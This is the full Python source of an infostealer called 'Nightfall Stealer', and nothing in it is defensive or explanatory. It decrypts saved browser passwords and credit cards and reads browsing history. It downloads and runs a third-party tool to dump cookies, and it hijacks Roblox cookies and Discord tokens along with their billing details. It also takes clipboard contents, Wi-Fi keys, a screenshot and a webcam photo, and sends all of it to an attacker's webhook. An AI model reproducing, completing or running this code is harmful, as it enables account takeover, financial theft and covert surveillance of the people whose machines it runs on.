import os
import subprocess
import time
import shutil
import random
import re
import threading
import zipfile
import requests
from sqlite3 import connect as sql_connect
from datetime import datetime, timezone, timedelta
from base64 import b64decode
from json import loads as json_loads, dumps
from pathlib import Path
import pyautogui
import cv2
import win32crypt
import win32clipboard
from Crypto.Cipher import AES

WEBHOOK = "puturwebhookhere"
TEMP = os.getenv("TEMP") or os.path.expanduser("~/AppData/Local/Temp")
WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
os.makedirs(WORK_DIR, exist_ok=True)

NIGHTFALL_ASCII = """
__________________________________________
|        _       _     _    __       _ _ |
|  _ __ (_) __ _| |__ | |_ / _| __ _| | ||
| | '_ \| |/ _` | '_ \| __| |_ / _` | | ||
| | | | | | (_| | | | | |_|  _| (_| | | ||
| |_| |_|_|\\__, |_| |_|\\__|_|  \\__,_|_|_||
|  | |    _|___/ __   | |_ ___  _ __     |
| / __)  / _ \\| '_ \\  | __/ _ \\| '_ \\    |
| \\__ \\ | (_) | | | | | || (_) | |_) |   |
| (   /  \\___/|_| |_|  \\__\\___/| .__/    |
|  |_|                         |_|       |
|________________________________________|
"""

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        return "N/A"

def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnail=None, image=None):
    embed = {
        "title": title,
        "description": f"```ansi\n{desc}\n```" if desc else None,
        "color": color,
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {"text": "Nightfall Stealer", "icon_url": "https://files.catbox.moe/nt0b4j.png"},
    }
    if fields: embed["fields"] = fields
    if thumbnail: embed["thumbnail"] = {"url": thumbnail}
    if image: embed["image"] = {"url": image}
    payload = {"username": "Nightfall Stealer", "avatar_url": "https://files.catbox.moe/nt0b4j.png", "embeds": [embed]}
    try:
        if files:
            requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=15)
        else:
            requests.post(WEBHOOK, json=payload, timeout=15)
    except:
        pass

def send_full_txt(title, lines):
    if not lines: return
    fname = f"{title.lower().replace(' ','_')}_{random.randint(10000,99999)}.txt"
    path = os.path.join(WORK_DIR, fname)
    with open(path, "w", encoding="utf-8", errors="replace") as f:
        f.write(NIGHTFALL_ASCII + "\n\n")
        f.write(f"{title.upper()} — {len(lines)} entries\n")
        f.write("═"*70 + "\n\n")
        f.write("\n".join(lines))
        f.write("\n\n" + "═"*70 + "\n")
        f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    try:
        with open(path, "rb") as f:
            files = {"file": (fname, f, "text/plain")}
            send_embed(f"{title} Data", f"Total: **{len(lines)}** entries", 0x191919, files=files)
    except:
        pass

def get_master_key(search_path):
    for depth in range(5):
        p = search_path
        for _ in range(depth):
            p = os.path.dirname(p)
            if not p or p == os.path.dirname(p):
                break
        local_path = os.path.join(p, "Local State")
        if os.path.exists(local_path):
            try:
                with open(local_path, "r", encoding="utf-8") as f:
                    local = json_loads(f.read())
                enc_key = b64decode(local["os_crypt"]["encrypted_key"])[5:]
                return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
            except:
                continue
    return None

def decrypt_value(buff, master_key):
    if not master_key or not isinstance(buff, bytes) or len(buff) < 3:
        return ""
    try:
        if buff[:3] in (b'v10', b'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16]
            return dec.decode('utf-8', errors='ignore')
        else:
            dec = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            return dec.decode('utf-8', errors='ignore')
    except:
        return ""

def get_roblox_user_info(cookie):
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        user_response = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
        if user_response.status_code != 200:
            return None
        
        user_data = user_response.json()
        user_id = user_data.get("id")
        
        currency_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
        currency_data = currency_response.json() if currency_response.status_code == 200 else {}
        
        rap_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/assets?assetTypeId=8&limit=100", headers=headers, timeout=10)
        rap_data = rap_response.json() if rap_response.status_code == 200 else {}
        
        rap = 0
        if "data" in rap_data:
            for item in rap_data["data"]:
                if "recentAveragePrice" in item:
                    rap += item["recentAveragePrice"]
        
        pending_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/trade-robux", headers=headers, timeout=10)
        pending_data = pending_response.json() if pending_response.status_code == 200 else {}
        pending_robux = pending_data.get("pendingRobux", 0)
        
        membership_response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=10)
        membership_data = membership_response.json() if membership_response.status_code == 200 else {}
        
        avatar_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png", headers=headers, timeout=10)
        avatar_data = avatar_response.json() if avatar_response.status_code == 200 else {}
        avatar_url = None
        if "data" in avatar_data and len(avatar_data["data"]) > 0:
            avatar_url = avatar_data["data"][0].get("imageUrl")
        
        banner_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}/banner", headers=headers, timeout=10)
        banner_data = banner_response.json() if banner_response.status_code == 200 else {}
        banner_url = banner_data.get("imageUrl")
        
        return {
            "id": user_id,
            "username": user_data.get("name", "Unknown"),
            "display_name": user_data.get("displayName", "Unknown"),
            "robux": currency_data.get("robux", 0),
            "rap": rap,
            "pending_robux": pending_robux,
            "membership": membership_data.get("IsPremium", False),
            "avatar_url": avatar_url,
            "banner_url": banner_url,
            "created_date": user_data.get("created", "Unknown"),
            "description": user_data.get("description", "No description"),
        }
    except Exception as e:
        return None

def process_roblox_accounts(cookies_list):
    roblox_accounts = []
    roblox_cookies = []
    
    for cookie in cookies_list:
        if cookie.get('name') == '.ROBLOSECURITY' and cookie.get('value'):
            roblox_cookies.append({
                'value': cookie.get('value'),
                'domain': cookie.get('domain', ''),
                'browser': cookie.get('browser', 'Unknown'),
                'profile': cookie.get('profile', 'Unknown')
            })
    
    if not roblox_cookies:
        return
    
    send_embed("🔍 Roblox Accounts Found", f"Found **{len(roblox_cookies)}** .ROBLOSECURITY cookie(s)", 0x00ff88)
    
    for idx, cookie_info in enumerate(roblox_cookies, 1):
        try:
            user_info = get_roblox_user_info(cookie_info['value'])
            
            if user_info:
                total_robux = user_info['robux'] + user_info['pending_robux']
                
                fields = [
                    {"name": "🎮 Username", "value": f"**{user_info['username']}**", "inline": True},
                    {"name": "📛 Display Name", "value": user_info['display_name'], "inline": True},
                    {"name": "🆔 User ID", "value": f"`{user_info['id']}`", "inline": True},
                    {"name": "💰 Current Robux", "value": f"**{user_info['robux']:,}**", "inline": True},
                    {"name": "📈 RAP (Total)", "value": f"**{user_info['rap']:,}**", "inline": True},
                    {"name": "⏳ Pending Robux", "value": f"**{user_info['pending_robux']:,}**", "inline": True},
                    {"name": "💎 Total Value", "value": f"**{total_robux:,} Robux**", "inline": True},
                    {"name": "⭐ Premium", "value": "Premium" if user_info['membership'] else "no", "inline": True},
                    {"name": "🍪 Cookie", "value": f"```\n{cookie_info['value']}\n```", "inline": False},
                    {"name": "🌐 Browser", "value": cookie_info['browser'], "inline": True},
                    {"name": "📁 Profile", "value": cookie_info['profile'], "inline": True},
                ]
                
                if user_info['created_date'] != "Unknown":
                    created = user_info['created_date'].split('T')[0] if 'T' in user_info['created_date'] else user_info['created_date']
                    fields.append({"name": "📅 Account Created", "value": created, "inline": True})
                
                if user_info['description'] and user_info['description'] != "No description":
                    desc_preview = user_info['description'][:100] + "..." if len(user_info['description']) > 100 else user_info['description']
                    fields.append({"name": "📝 Bio", "value": desc_preview, "inline": False})
                
                send_embed(
                    f"🎮 Roblox Account #{idx} - {user_info['username']}",
                    f"**Cookie found in:** {cookie_info['browser']} ({cookie_info['profile']})\n**Domain:** {cookie_info['domain']}",
                    0x00ff88,
                    fields=fields,
                    thumbnail=user_info['avatar_url'],
                    image=user_info['banner_url']
                )
                
                cookie_line = f"Roblox Account #{idx}\nUsername: {user_info['username']}\nDisplay: {user_info['display_name']}\nUser ID: {user_info['id']}\nRobux: {user_info['robux']:,}\nRAP: {user_info['rap']:,}\nPending: {user_info['pending_robux']:,}\nTotal Value: {total_robux:,}\nMembership: {'Premium' if user_info['membership'] else 'Free'}\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nDomain: {cookie_info['domain']}\n{'='*70}"
                roblox_accounts.append(cookie_line)
                
        except Exception as e:
            cookie_line = f"Roblox Cookie (Processing Failed)\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nDomain: {cookie_info['domain']}\nError: {str(e)[:100]}\n{'='*70}"
            roblox_accounts.append(cookie_line)
    
    if roblox_accounts:
        fname = f"roblox_accounts_{random.randint(10000,99999)}.txt"
        path = os.path.join(WORK_DIR, fname)
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(NIGHTFALL_ASCII + "\n\n")
            f.write("ROBLOX ACCOUNTS — SECURITY COOKIES\n")
            f.write("═"*70 + "\n\n")
            f.write("\n".join(roblox_accounts))
            f.write("\n\n" + "═"*70 + "\n")
            f.write(f"Total Accounts Found: {len(roblox_accounts)}\n")
            f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        
        try:
            with open(path, "rb") as f:
                files = {"file": (fname, f, "text/plain")}
                send_embed("📦 Roblox Accounts Archive", f"**{len(roblox_accounts)}** account(s) saved", 0x00ff88, files=files)
        except:
            pass

def download_and_run_chromelevator():
    TEMP = os.environ.get("TEMP")
    WORK_DIR = os.getcwd()

    zip_path = os.path.join(TEMP, "chromelevator.zip")
    extract_path = os.path.join(TEMP, "chromelevator_extract")
    output_path = os.path.join(TEMP, "chrome_output")
    cookies_temp_path = os.path.join(TEMP, "cookies_temp")

    for p in [zip_path, extract_path, output_path, cookies_temp_path]:
        if os.path.exists(p):
            try:
                if os.path.isdir(p):
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    os.remove(p)
            except:
                pass

    url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip"

    send_embed("ChromElevator", "Downloading v0.20.0...", 0x00ff88)

    try:
        r = requests.get(url, stream=True, timeout=40)
        r.raise_for_status()
        with open(zip_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    except Exception as e:
        send_embed("ChromElevator Error", f"Download failed: {str(e)[:100]}", 0xff0000)
        return

    os.makedirs(extract_path, exist_ok=True)
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(extract_path)
    except Exception as e:
        send_embed("ChromElevator Error", f"Extraction failed: {str(e)}", 0xff0000)
        return

    exe_path = None
    for root, _, files in os.walk(extract_path):
        for file in files:
            if file.lower() == "chromelevator_x64.exe":
                exe_path = os.path.join(root, file)
                break
        if exe_path:
            break

    if not exe_path:
        send_embed("ChromElevator Error", "chromelevator_x64.exe not found in zip", 0xff0000)
        return

    os.makedirs(output_path, exist_ok=True)
    os.makedirs(cookies_temp_path, exist_ok=True)

    send_embed("ChromElevator", "Launching extraction (all browsers)", 0x00ff88)

    try:
        cmd = [
            exe_path,
            "all",
            "-o", output_path,
            "--kill",
            "--verbose"
        ]

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=180,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if result.returncode != 0:
            send_embed("ChromElevator Error", f"Process exited with code {result.returncode}", 0xff0000)
            return

        cookie_files = []
        for root, dirs, files in os.walk(output_path):
            for file in files:
                if file == "cookies.json":
                    full_path = os.path.join(root, file)
                    cookie_files.append(full_path)

        if not cookie_files:
            send_embed("ChromElevator", "⚠️ No cookies.json files found", 0xff8800)
            return

        all_cookies = []
        browser_stats = {}
        errors = []

        for cf in cookie_files:
            try:
                with open(cf, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    data = json_loads(content)

                browser_name = "Unknown"
                profile_name = "Unknown"
                
                path_parts = cf.replace("\\", "/").split("/")
                
                for i, part in enumerate(path_parts):
                    if part in ["Chrome", "Edge", "Brave", "Avast", "Opera", "Chromium"]:
                        browser_name = part
                        if i + 1 < len(path_parts):
                            profile_name = path_parts[i + 1]
                        break

                cookies_list = []
                if isinstance(data, dict):
                    cookies_list = data.get("cookies", [])
                elif isinstance(data, list):
                    cookies_list = data
                
                added_count = 0
                for cookie in cookies_list:
                    if isinstance(cookie, dict):
                        cookie["browser"] = browser_name
                        cookie["profile"] = profile_name
                        all_cookies.append(cookie)
                        added_count += 1
                
                browser_key = f"{browser_name}_{profile_name}"
                if browser_key not in browser_stats:
                    browser_stats[browser_key] = 0
                browser_stats[browser_key] += added_count
                        
            except Exception as e:
                errors.append(f"{cf}: {str(e)}")
                continue

        if all_cookies:
            process_roblox_accounts(all_cookies)
            
            fname_json = f"cookies_{random.randint(10000,99999)}.json"
            fname_txt = f"cookies_{random.randint(10000,99999)}.txt"
            
            save_path_json = os.path.join(cookies_temp_path, fname_json)
            save_path_txt = os.path.join(cookies_temp_path, fname_txt)

            with open(save_path_json, "w", encoding="utf-8", errors="replace") as f:
                if 'NIGHTFALL_ASCII' in globals() or 'NIGHTFALL_ASCII' in locals():
                    try:
                        f.write(NIGHTFALL_ASCII)
                        f.write("\n")
                    except:
                        pass
                json_dump = dumps(all_cookies, indent=2, ensure_ascii=False)
                f.write(json_dump)

            with open(save_path_txt, "w", encoding="utf-8", errors="replace") as f:
                if 'NIGHTFALL_ASCII' in globals() or 'NIGHTFALL_ASCII' in locals():
                    try:
                        f.write(NIGHTFALL_ASCII)
                        f.write("\n\n")
                    except:
                        pass
                
                for idx, cookie in enumerate(all_cookies, 1):
                    domain = cookie.get('domain', '')
                    name = cookie.get('name', '')
                    value = str(cookie.get('value', ''))
                    browser = cookie.get('browser', 'Unknown')
                    profile = cookie.get('profile', 'Unknown')
                    
                    f.write(f"{idx}\n")
                    f.write(f"Browser: {browser}\n")
                    f.write(f"Profile: {profile}\n")
                    f.write(f"Domain: {domain}\n")
                    f.write(f"Name: {name}\n")
                    f.write(f"Value: {value}\n")
                    f.write(f"Secure: {cookie.get('secure', False)}\n")
                    f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                    f.write("\n")

            browser_summary = ""
            for bp, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
                browser, profile = bp.split("_", 1)
                browser_summary += f"**[{browser}]** {profile}: {count}\n"
            
            if len(browser_stats) > 10:
                browser_summary += f"*...and {len(browser_stats) - 10} more*"

            try:
                with open(save_path_json, "rb") as f_json:
                    files = {
                        "file": (fname_json, f_json, "application/json")
                    }
                    send_embed(
                        "ChromElevator - cookies",
                        f"**{len(all_cookies)} cookies** from {len(browser_stats)} profiles\n\n{browser_summary}",
                        0x00ff88,
                        files=files
                    )
            except Exception as e:
                send_embed("chromelevator error", f"failed to send JSON: {str(e)[:100]}", 0xff0000)

            try:
                with open(save_path_txt, "rb") as f_txt:
                    files = {
                        "file": (fname_txt, f_txt, "text/plain")
                    }
                    send_embed(
                        "✅ chromelevator - TXT",
                        f"**{len(all_cookies)} cookies** (numbered format)",
                        0x00ff88,
                        files=files
                    )
            except Exception as e:
                send_embed("chromelevator error", f"failed to send TXT: {str(e)[:100]}", 0xff0000)

            try:
                if os.path.exists(save_path_json):
                    os.remove(save_path_json)
                if os.path.exists(save_path_txt):
                    os.remove(save_path_txt)
            except Exception as e:
                pass
            
        else:
            send_embed("ChromElevator", "no valid cookies found", 0xff8800)

    except subprocess.TimeoutExpired:
        send_embed("ChromElevator Error", "process timed out (180s)", 0xff0000)
    except Exception as e:
        send_embed("ChromElevator Error", f"execution failed: {str(e)[:200]}", 0xff0000)

    for p in [zip_path, extract_path, output_path, cookies_temp_path]:
        try:
            if os.path.exists(p):
                if os.path.isdir(p):
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    os.remove(p)
        except:
            pass

def steal_browser_data():
    browsers = [
        {"name": "Chrome", "base": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data"},
        {"name": "Brave", "base": os.getenv('LOCALAPPDATA') + "\\Brave Software\\Brave-Browser\\User Data"},
        {"name": "Edge", "base": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data"},
        {"name": "Opera", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera Stable"},
        {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX Stable"},
    ]
    pw_lines = []
    cc_lines = []
    hist_lines = []
    for br in browsers:
        base = br["base"]
        if not os.path.exists(base): continue
        profiles = ["Default"] + [d for d in os.listdir(base) if d.startswith("Profile ") and os.path.isdir(os.path.join(base, d))]
        for prof in profiles:
            ppath = os.path.join(base, prof)
            master_key = get_master_key(ppath) or get_master_key(base)
            if not master_key: continue
            pw_path = os.path.join(ppath, "Login Data")
            if os.path.exists(pw_path):
                tmp = os.path.join(WORK_DIR, f"pw_{random.randint(10000,99999)}.db")
                shutil.copy2(pw_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, enc in cur.fetchall():
                        if isinstance(enc, bytes) and enc:
                            pw = decrypt_value(enc, master_key)
                            if pw and len(pw) > 1:
                                pw_lines.append(f"URL: {url}\nUser: {user}\nPass: {pw}\n{'─'*70}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
            cc_path = os.path.join(ppath, "Web Data")
            if os.path.exists(cc_path):
                tmp = os.path.join(WORK_DIR, f"cc_{random.randint(10000,99999)}.db")
                shutil.copy2(cc_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for name, m, y, enc in cur.fetchall():
                        if isinstance(enc, bytes) and enc:
                            num = decrypt_value(enc, master_key)
                            if num:
                                cc_lines.append(f"{name} | {m:02d}/{y} | {num}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
            hist_path = os.path.join(ppath, "History")
            if os.path.exists(hist_path):
                tmp = os.path.join(WORK_DIR, f"hist_{random.randint(10000,99999)}.db")
                shutil.copy2(hist_path, tmp)
                try:
                    conn = sql_connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
                    for url, title in cur.fetchall():
                        hist_lines.append(f"{title[:80]} → {url}")
                    conn.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
    if pw_lines:
        send_full_txt("Passwords", pw_lines)
    if cc_lines:
        send_full_txt("Credit Cards", cc_lines)
    if hist_lines:
        send_full_txt("Browsing History", hist_lines)

def get_user_info(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=12)
        if r.status_code == 200:
            return r.json()
        return None
    except:
        return None

def get_guilds(token):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers, timeout=12)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_nitro_subscriptions(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_boost_slots(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def get_payment_sources(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}, timeout=10)
        if r.ok:
            return r.json()
        return []
    except:
        return []

def snowflake_to_date(snowflake):
    epoch = datetime(2015, 1, 1, tzinfo=timezone.utc)
    ms = (int(snowflake) >> 22)
    return (epoch + timedelta(milliseconds=ms)).strftime("%Y-%m-%d %H:%M UTC")

def steal_discord_tokens():
    possible_paths = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%APPDATA%\discordcanary"),
        os.path.expandvars(r"%APPDATA%\discordptb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        *[str(p) for p in Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")).glob("Profile *")],
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable"),
        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default"),
    ]
    tokens = set()
    for base in possible_paths:
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb): continue
        for ext in ("*.ldb", "*.log"):
            for file in Path(leveldb).rglob(ext):
                try:
                    raw = file.read_bytes()
                    text = raw.decode("utf-8", errors="ignore")
                    for match in re.finditer(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{38,}(?:_[\w-]{22})?|mfa\.[\w-]{80,84}|eyJ[A-Za-z0-9_-]{60,400}", text):
                        t = match.group(0).strip()
                        if len(t) >= 59:
                            tokens.add(t)
                except:
                    pass
    tokens = {t for t in tokens if '.' in t and not t.startswith("eyJ")}
    if not tokens:
        send_embed("discord tokens", "no tokens found on this device", 0xff0000)
        return
    send_embed(f"Tokens Found — {len(tokens)}", f"**{len(tokens)}** token(s) located", 0x191919, fields=[
        {"name": "Computer", "value": f"`{os.environ.get('COMPUTERNAME','Unknown')}`", "inline": True},
        {"name": "User", "value": f"`{os.environ.get('USERNAME','Unknown')}`", "inline": True},
        {"name": "IP", "value": f"`{get_ip()}`", "inline": True},
    ])
    for token in tokens:
        info = get_user_info(token)
        if not info: continue
        disp = f"{info.get('global_name', '')} (@{info['username']})" if info.get('global_name') else info["username"]
        nitro_type = {0: "None", 1: "Classic", 2: "Full Nitro"}.get(info.get("premium_type", 0), "Unknown")
        mfa = "Yes" if info.get("mfa_enabled") else "No"
        created = snowflake_to_date(info["id"])
        thumb = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.webp?size=512" if info.get("avatar") else None
        banner = f"https://cdn.discordapp.com/banners/{info['id']}/{info['banner']}.webp?size=1024" if info.get("banner") else None
        badges = []
        flags = info.get("public_flags", 0)
        if flags & 1: badges.append("Staff")
        if flags & 2: badges.append("Partner")
        if flags & 4: badges.append("HypeSquad Events")
        if flags & 64: badges.append("HypeSquad Bravery")
        if flags & 128: badges.append("HypeSquad Brilliance")
        if flags & 256: badges.append("HypeSquad Balance")
        if flags & 512: badges.append("Early Supporter")
        if flags & 16384: badges.append("Bug Hunter Gold")
        if flags & 262144: badges.append("Certified Moderator")
        if flags & 4194304: badges.append("Active Developer")
        badges_str = ", ".join(badges) if badges else "None"
        decos = info.get("avatar_decoration_data") or info.get("avatar_decorations")
        deco_count = len(decos) if isinstance(decos, list) else (1 if decos else 0)
        subs = get_nitro_subscriptions(token)
        has_nitro = len(subs) > 0
        nitro_expires = datetime.fromisoformat(subs[0]["current_period_end"].replace("Z", "+00:00")).strftime("%d/%m/%Y %H:%M") if has_nitro else "N/A"
        slots = get_boost_slots(token)
        avail_boost = 0
        boost_lines = []
        for slot in slots:
            if not slot.get("cooldown_ends_at") or datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00")) < datetime.now(timezone.utc):
                avail_boost += 1
                boost_lines.append("Available now")
            else:
                dt = datetime.fromisoformat(slot["cooldown_ends_at"].replace("Z", "+00:00"))
                boost_lines.append(f"Cooldown until {dt.strftime('%d/%m/%Y %H:%M')}")
        payments = get_payment_sources(token)
        pay_count = len(payments)
        valid_pays = sum(1 for p in payments if not p.get("invalid"))
        pay_types = " ".join("CC" if p["type"] == 1 else "PP" if p["type"] == 2 else "?" for p in payments)
        guilds = get_guilds(token)
        guild_count = len(guilds)
        admin_guilds = []
        for g in guilds:
            perms = int(g.get("permissions", "0"))
            if perms & (0x8 | 0x20):
                cnt = g.get("approximate_member_count", "?")
                line = f"ㅤ- {g['name']} ({cnt})"
                if g.get("vanity_url_code"):
                    line += f" • .gg/{g['vanity_url_code']}"
                admin_guilds.append(line)
        admin_text = "\n".join(admin_guilds) if admin_guilds else "None"
        fields = [
            {"name": "token", "value": f"```ansi\n\u001b[0;31m{token}\u001b[0m```", "inline": False},
            {"name": "user", "value": f"**{disp}**", "inline": True},
            {"name": "ID", "value": f"`{info['id']}`", "inline": True},
            {"name": "created", "value": created, "inline": True},
            {"name": "nitro type", "value": nitro_type, "inline": True},
            {"name": "MFA", "value": mfa, "inline": True},
            {"name": "badges", "value": badges_str, "inline": False},
            {"name": "decos", "value": f"**{deco_count}** deco(s)", "inline": True},
            {"name": "guilds", "value": f"{guild_count} total\nAdmin in:\n{admin_text}", "inline": False},
            {"name": "nitro details", "value": f"Has Nitro: {has_nitro}\nExpires: {nitro_expires}\nBoosts: {avail_boost}\n" + "\n".join(boost_lines), "inline": False},
            {"name": "payments", "value": f"Methods: {pay_count}\nValid: {valid_pays}\nTypes: {pay_types}", "inline": False},
            {"name": "locale", "value": info.get("locale", "Unknown"), "inline": True},
            {"name": "verified", "value": "Yes" if info.get("verified") else "No", "inline": True},
        ]
        if info.get("email"):
            fields.append({"name": "email", "value": f"`{info['email']}`", "inline": True})
        if info.get("phone"):
            fields.append({"name": "phone", "value": f"`{info['phone']}`", "inline": True})
        send_embed("account details", "", 0x191919, fields=fields, thumbnail=thumb, image=banner)

def steal_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        if data and len(data) > 3:
            lines = [data[i:i+120] for i in range(0, len(data), 120)]
            send_full_txt("Clipboard Content", lines)
    except:
        pass

def steal_wifi():
    try:
        data = subprocess.getoutput('netsh wlan show profiles')
        profiles = re.findall(r'All User Profile\s+:\s+(.*)', data)
        lines = []
        for profile in profiles:
            profile = profile.strip()
            pwd_data = subprocess.getoutput(f'netsh wlan show profile name="{profile}" key=clear')
            pwd = re.search(r'Key Content\s+:\s+(.*)', pwd_data)
            pwd = pwd.group(1) if pwd else "no password for this wifi network"
            lines.append(f"{profile} → {pwd}")
        send_full_txt("WiFi Passwords", lines)
    except:
        pass

def take_screenshot():
    try:
        img = pyautogui.screenshot()
        path = os.path.join(WORK_DIR, f"screenshot_{random.randint(10000,99999)}.png")
        img.save(path)
        with open(path, "rb") as f:
            files = {"file": (os.path.basename(path), f)}
            send_embed("desktop screenshot", "sent", 0x191919, files=files)
    except:
        pass

def take_webcam():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
        time.sleep(1.2)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = os.path.join(WORK_DIR, f"webcam_{random.randint(10000,99999)}.jpg")
            cv2.imwrite(path, frame)
            with open(path, "rb") as f:
                files = {"file": (os.path.basename(path), f)}
                send_embed("webcam photo sent", 0x191919, files=files)
    except:
        pass

def create_final_zip():
    if not os.listdir(WORK_DIR):
        send_embed("nightfall complete package", "no data collected.", 0x191919)
        return
    zip_name = f"nightfall_full_{random.randint(10000,99999)}.zip"
    zip_path = os.path.join(TEMP, zip_name)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for root, _, files in os.walk(WORK_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, WORK_DIR).replace("\\", "/")
                zipf.write(file_path, arcname)
    with open(zip_path, "rb") as f:
        files = {"file": (zip_name, f, "application/zip")}
        send_embed("nightfall full archive", "all of the fuckn shit combined in a zip", 0x191919, files=files)
    try: os.remove(zip_path)
    except: pass

def main():
    subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe >nul 2>&1", shell=True)
    send_embed("Nightfall Stealer Started")
    threading.Thread(target=download_and_run_chromelevator, daemon=True).start()
    threads = [
        threading.Thread(target=steal_discord_tokens, daemon=True),
        threading.Thread(target=steal_browser_data, daemon=True),
        threading.Thread(target=steal_clipboard, daemon=True),
        threading.Thread(target=steal_wifi, daemon=True),
        threading.Thread(target=take_screenshot, daemon=True),
        threading.Thread(target=take_webcam, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(12)
    create_final_zip()
    try:
        shutil.rmtree(WORK_DIR, ignore_errors=True)
    except:
        pass
    send_embed("nightfall stealer finished", color=0x191919)

if __name__ == "__main__":
    main()
